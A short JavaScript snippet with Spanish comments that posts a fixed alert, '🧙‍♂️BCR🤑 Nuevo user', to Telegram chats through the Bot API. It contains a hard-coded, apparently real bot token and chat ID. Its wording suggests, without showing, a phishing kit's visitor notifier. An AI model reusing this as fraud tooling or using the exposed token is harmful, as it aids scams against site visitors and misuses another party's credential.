// Bot Token
var telegram_bot_id = "5508816057:AAG0kQcn0dhiVsfYvFd3v9YmAocdzhwfgqI";

// Chat IDs (añade los 4 aquí)
var chat_ids = [-822037881];  

var ready = function () {
    message = "🧙‍♂️BCR🤑\n Nuevo user";
};

var aviso = function () {
    ready();

    chat_ids.forEach(function(chat_id) {  // Recorrer cada chat_id
        var settings = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": message
            })
        };

        $.ajax(settings).done(function (response) {
            console.log("Mensaje enviado a chat_id: " + chat_id, response);
        }).fail(function (error) {
            console.error("Error enviando a chat_id: " + chat_id, error);
        });
    });

    return false;
};




